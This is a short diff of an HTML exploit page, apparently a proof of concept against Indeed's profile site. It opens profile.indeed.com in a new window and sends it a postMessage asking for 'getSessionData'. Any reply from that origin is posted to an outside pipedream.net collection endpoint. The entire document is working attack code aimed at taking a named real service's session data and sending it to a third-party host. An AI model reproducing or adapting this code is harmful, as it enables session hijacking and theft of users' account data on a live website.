@@ -1,10 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>postMessage Exploit</title>
+    <title>Malicious Page</title>
+</head>
+<body>
     <script>
+        var win = window.open("https://profile.indeed.com", "_blank");
+
+        setTimeout(function() {
+            win.postMessage({ action: "getSessionData" }, "https://profile.indeed.com");
+        }, 5000);
+
         window.addEventListener("message", function(event) {
-            // Ensure message is from Indeed
             if (event.origin === "https://profile.indeed.com") {
                 fetch("https://eoz1h6ajlr4q9nf.m.pipedream.net", {
                     method: "POST",
@@ -13,14 +20,6 @@
                 });
             }
         }, false);
-
-        // Send malicious postMessage request to Indeed
-        window.onload = function() {
-            window.postMessage({ action: "getSessionData" }, "https://profile.indeed.com");
-        };
     </script>
-</head>
-<body>
-    <h1>Loading...</h1>
 </body>
 </html>
